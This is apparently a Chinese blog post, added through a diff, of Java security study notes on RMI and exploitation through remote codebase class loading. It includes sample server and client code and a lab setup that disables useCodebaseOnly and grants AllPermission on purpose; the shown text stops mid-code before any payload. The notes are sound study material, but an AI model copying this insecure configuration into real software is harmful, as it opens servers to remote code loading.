@@ -1,0 +1,803 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="rightevil">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="基础知识 RMI的三个组成部分：   Registry：类似电话簿。只负责记录哪个名字对应哪个对象。 Server：真正干活的人，提供实际的函数逻辑，并把自己的引用注册到Registry上。 Client：调用者。先查Registry，拿到Server的存根（stub），然后直接找Server办事。  RMI的连接过程：  第一次连接：Client-&gt;Registry（1099端口）   c">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java安全学习笔记2">
+<meta property="og:url" content="https://rightevil.github.io/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/index.html">
+<meta property="og:site_name" content="rightevil">
+<meta property="og:description" content="基础知识 RMI的三个组成部分：   Registry：类似电话簿。只负责记录哪个名字对应哪个对象。 Server：真正干活的人，提供实际的函数逻辑，并把自己的引用注册到Registry上。 Client：调用者。先查Registry，拿到Server的存根（stub），然后直接找Server办事。  RMI的连接过程：  第一次连接：Client-&gt;Registry（1099端口）   c">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/57713373/1765848707635-7b554918-7eb5-426c-a320-bcc3a6b2c2c7.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/57713373/1765848445653-abe5f96a-bfb3-49c1-aba8-0f64793ef301.png">
+<meta property="article:published_time" content="2025-12-16T01:37:54.000Z">
+<meta property="article:modified_time" content="2025-12-16T01:42:31.240Z">
+<meta property="article:author" content="rightevil">
+<meta property="article:tag" content="javasec">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2025/png/57713373/1765848707635-7b554918-7eb5-426c-a320-bcc3a6b2c2c7.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>java安全学习笔记2 - rightevil</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"rightevil.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":"UA-285611083-1","gtag":"G-TKYW22HREX","tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript('https://www.google-analytics.com/analytics.js', function() {
+          window.ga = window.ga || function() { (ga.q = ga.q || []).push(arguments) };
+          ga.l = +new Date;
+          ga('create', 'UA-285611083-1', 'auto');
+          ga('send', 'pageview');
+        });
+      }
+    </script>
+  
+
+  
+    <!-- Google gtag.js -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript('https://www.googletagmanager.com/gtag/js?id=G-TKYW22HREX', function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-TKYW22HREX');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<!-- hexo injector head_end start -->
+    <div id="fb-root"></div>
+    <script async defer crossorigin="anonymous" src="https://connect.facebook.net/zh_TW/sdk.js#xfbml=1&version=v12.0"></script>
+  <!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>舔狗日记</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                好友blog
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="java安全学习笔记2"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-12-16 09:37" pubdate>
+          2025年12月16日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          67 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">java安全学习笔记2</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="cWqfv">基础知识</h1>
+RMI的三个组成部分：
+
+<ul>
+<li>Registry：类似电话簿。只负责记录哪个名字对应哪个对象。</li>
+<li>Server：真正干活的人，提供实际的函数逻辑，并把自己的引用注册到Registry上。</li>
+<li>Client：调用者。先查Registry，拿到Server的存根（stub），然后直接找Server办事。</li>
+</ul>
+<p>RMI的连接过程：</p>
+<ul>
+<li>第一次连接：Client-&gt;Registry（1099端口）</li>
+</ul>
+<blockquote>
+<p>client问Hello在哪？Registry回答Hello在192.168.x.x的33789端口。这里传输序列化数据。</p>
+</blockquote>
+<ul>
+<li>第二次连接：Client-&gt;Server(随机的33789端口)</li>
+</ul>
+<blockquote>
+<p>Client说我要调用hello()方法。Server执行后返回结果。</p>
+</blockquote>
+<p>简单RMI实现代码(因为没系统学过Java，所以有一些疑问我让ai给了注释放里面了)：</p>
+<p>Server:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.vulhub.RMI; <span class="hljs-comment">// 假设包名为 org.vulhub.RMI</span><br><br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br><br>    <span class="hljs-comment">// ==========================================</span><br>    <span class="hljs-comment">// 【问题 3 解答】：为什么只有定义？</span><br>    <span class="hljs-comment">// C语言类比：这相当于 .h 头文件。</span><br>    <span class="hljs-comment">// Python类比：相当于抽象基类 (Abstract Base Class)。</span><br>    <span class="hljs-comment">// 作用：这是一份“契约/菜单”。客户端在本地没有服务端的具体代码，</span><br>    <span class="hljs-comment">// 但只要手里有这份接口定义，就知道服务端提供了什么方法，从而敢放心调用。</span><br>    <span class="hljs-comment">// extends Remote：这是 RMI 的硬性规定，标记该接口可被远程调用。</span><br>    <span class="hljs-comment">// ==========================================</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteHelloWorld</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>        <span class="hljs-comment">// 必须抛出 RemoteException，因为网络通信是不可靠的，客户端需要处理网络错误</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    &#125;<br><br>    <span class="hljs-comment">// ==========================================</span><br>    <span class="hljs-comment">// 【问题 1 解答】：为什么定义内部类？为什么构造函数抛异常？</span><br>    <span class="hljs-comment">// 1. 内部类：纯粹为了省事（演示方便），不用新建一个 .java 文件。</span><br>    <span class="hljs-comment">//    就像 Python 在一个脚本里写多个 class。在真实工程中通常是独立文件。</span><br>    <span class="hljs-comment">// 2. 抛异常：这是 Java 特有的“检查型异常”机制。</span><br>    <span class="hljs-comment">//    父类 UnicastRemoteObject 的构造函数里做了 socket 监听操作，声明了“可能会报错”。</span><br>    <span class="hljs-comment">//    Java 编译器强制规定：子类在初始化父类（super()）时，必须对外声明同样的风险。</span><br>    <span class="hljs-comment">// ==========================================</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteHelloWorld</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IRemoteHelloWorld</span> &#123;<br>        <br>        <span class="hljs-keyword">protected</span> <span class="hljs-title function_">RemoteHelloWorld</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>            <span class="hljs-built_in">super</span>(); <span class="hljs-comment">// 调用父类构造函数，开启随机端口监听 TCP 连接</span><br>        &#125;<br><br>        <span class="hljs-comment">// 实现接口中定义的方法</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>            <span class="hljs-comment">// 这行代码是在【服务端】执行的，只有服务端的控制台会打印</span><br>            System.out.println(<span class="hljs-string">&quot;call from&quot;</span>); <br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello world&quot;</span>; <span class="hljs-comment">// 返回值会被序列化，通过网络传回给客户端</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 实例化对象。注意：此时它已经在随机端口监听 TCP 连接了（等待客户端的第二次连接）。</span><br>        <span class="hljs-type">RemoteHelloWorld</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteHelloWorld</span>();<br>        <br>        <span class="hljs-comment">// 启动“电话查号台”（Registry），监听 1099 端口（客户端的第一次连接）。</span><br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <br>        <span class="hljs-comment">// ==========================================</span><br>        <span class="hljs-comment">// 【问题 2 解答】：rebind 只是注册，怎么知道调哪个方法？</span><br>        <span class="hljs-comment">// 类比：这里只是在电话黄页上登记： &quot;Hello&quot; -&gt; &quot;h 对象 (IP:Port)&quot;。</span><br>        <span class="hljs-comment">// Naming.rebind 只负责让客户端能“找到”这个对象。</span><br>        <span class="hljs-comment">// 至于客户端找到后是调用 hello() 还是其他方法，由客户端代码决定。</span><br>        <span class="hljs-comment">// ==========================================</span><br>        Naming.rebind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, h);<br>    &#125;<br><br>    <span class="hljs-comment">// ==========================================</span><br>    <span class="hljs-comment">// 【问题 4 解答】：为什么 main 函数定义在类里面？</span><br>    <span class="hljs-comment">// C语言类比：Java 不允许存在脱离 Class 的全局函数（没有 global scope）。</span><br>    <span class="hljs-comment">// 所以入口函数 main 只能“寄生”在某个类里。</span><br>    <span class="hljs-comment">// static 意味着它属于类本身，不依赖对象实例，约等于 C 的全局函数。</span><br>    <span class="hljs-comment">// ==========================================</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIServer</span>().start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>Client:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.vulhub.Train; <span class="hljs-comment">// 假设包名为 org.vulhub.Train</span><br><br><span class="hljs-comment">// ==========================================</span><br><span class="hljs-comment">// 【问题 5 解答】：现实场景中怎么引入源码？</span><br><span class="hljs-comment">// 现实中，Client 和 Server 分离（甚至在不同国家）。</span><br><span class="hljs-comment">// 做法：服务端开发者会把 IRemoteHelloWorld 接口（不包含实现类）编译并打成一个 .jar 包。</span><br><span class="hljs-comment">// 客户端下载这个 jar 包，import 进来，就能通过编译了。</span><br><span class="hljs-comment">// 这里因为演示代码在同一个工程里，所以直接 import 了服务端的类。</span><br><span class="hljs-comment">// ==========================================</span><br><span class="hljs-keyword">import</span> org.vulhub.RMI.RMIServer;<br><br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TrainMain</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <br>        <span class="hljs-comment">// ==========================================</span><br>        <span class="hljs-comment">// 【问题 6 解答】：为什么是实现接口，而不是实例化类？</span><br>        <span class="hljs-comment">// 核心原因：你不能 new 一个在别人电脑上的对象。</span><br>        <span class="hljs-comment">// Naming.lookup 返回的其实是一个“替身”（Stub/代理对象）。</span><br>        <span class="hljs-comment">// 这个替身在网络层面伪装成了服务端对象，在 Java 语法层面宣称自己实现了 IRemoteHelloWorld 接口。</span><br>        <span class="hljs-comment">// 所以我们强制转换成接口类型 (Interface)，而不是具体类 (Class)。</span><br>        <span class="hljs-comment">// ==========================================</span><br>        RMIServer.<span class="hljs-type">IRemoteHelloWorld</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> (RMIServer.IRemoteHelloWorld) Naming.lookup(<span class="hljs-string">&quot;rmi://192.168.135.142:1099/Hello&quot;</span>);<br>        <br>        <span class="hljs-comment">// ==========================================</span><br>        <span class="hljs-comment">// 【问题 2 补充】：怎么知道调哪个方法？</span><br>        <span class="hljs-comment">// 在这里！客户端拿到了“替身” hello，代码里显式写了调用 .hello() 方法。</span><br>        <span class="hljs-comment">// “替身”会通过网络把这个请求（方法名、参数）发给服务端。</span><br>        <span class="hljs-comment">// ==========================================</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> hello.hello();<br>        <br>        System.out.println(ret);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>codebase：</p>
+<p>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，与CLASSPATH很像，但是CLASSPATH是本地路径，而codebase通常是远程url。若我们指定codebase=<a target="_blank" rel="noopener" href="http://example.com,然后加载org.test.example.example类,则java虚拟机会下载http//example.com/org/test/example/Example.class%EF%BC%8C%E5%B9%B6%E4%BD%9C%E4%B8%BAExample%E7%B1%BB%E7%9A%84%E5%AD%97%E8%8A%82%E7%A0%81%E3%80%82">http://example.com，然后加载org.test.example.Example类，则Java虚拟机会下载http://example.com/org/test/example/Example.class，并作为Example类的字节码。</a></p>
+<p><font style="color:rgb(51,51,51);">RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在本地没有找到这个类，就会去远程加载codebase中的类。</font></p>
+<h1 id="VnoKI">RMI利用</h1>
+在RMI中，如果我们可以控制codebase，那我们就可以去任意的加载我们的恶意类从而实现我们的想法。
+
+<p>但是官方也注意到了这个隐患，所以如果想通过codebase去利用，还需要：</p>
+<ul>
+<li>安装并配置了SecurityManager</li>
+<li>Java版本低于7u21、6u45，或者设置了java.rmi.server.useCodebaseOnly=false</li>
+</ul>
+<p>若java.rmi.server.useCodebaseOnly为true，则Java虚拟机只信任预先配置好的codebase，不再支持从RMI请求中获取</p>
+<p>复现流程：</p>
+<p>首先我的目录是这样的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">rmitest<br>├─ .gitignore<br>├─ Calc.class<br>├─ Calc.java<br>├─ client.policy<br>├─ ICalc.class<br>├─ ICalc.java<br>├─ RemoteRMIServer.class<br>├─ RemoteRMIServer.java<br>├─ RMIClient.java<br>├─ rmitest.iml<br>└─ client<br>   ├─ ICalc.class<br>   ├─ RMIClient$Payload.class<br>   └─ RMIClient.class<br></code></pre></td></tr></table></figure>
+
+<p>然后是每个文件：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">Calc.java<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ICalc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Calc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;&#125;<br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">sum</span><span class="hljs-params">(List&lt;Integer&gt; params)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (Integer param : params) &#123;<br>            sum += param;<br>        &#125;<br>        <span class="hljs-keyword">return</span> sum;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">ICalc.java<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ICalc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">sum</span><span class="hljs-params">(List&lt;Integer&gt; params)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">client.policy<br>grant &#123;<br>    permission java.security.AllPermission;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java">RemoteRMIServer.java<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteRMIServer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-literal">null</span>) &#123;<br>            System.out.println(<span class="hljs-string">&quot;setup SecurityManager&quot;</span>);<br>            System.setProperty(<span class="hljs-string">&quot;java.security.policy&quot;</span>,<span class="hljs-string">&quot;D:\\javasec\\javaproject\\rmitest\\client.policy&quot;</span>);<br>            System.setProperty(<span class="hljs-string">&quot;java.rmi.server.hostname&quot;</span>,<span class="hljs-string">&quot;10.252.92.135&quot;</span>);<br>            System.setProperty(<span class="hljs-string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>,<span class="hljs-string">&quot;false&quot;</span>);<br>            System.setSecurityManager(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SecurityManager</span>());<br>        &#125;<br>        <span class="hljs-type">Calc</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Calc</span>();<br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        Naming.rebind(<span class="hljs-string">&quot;refObj&quot;</span>, h);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span 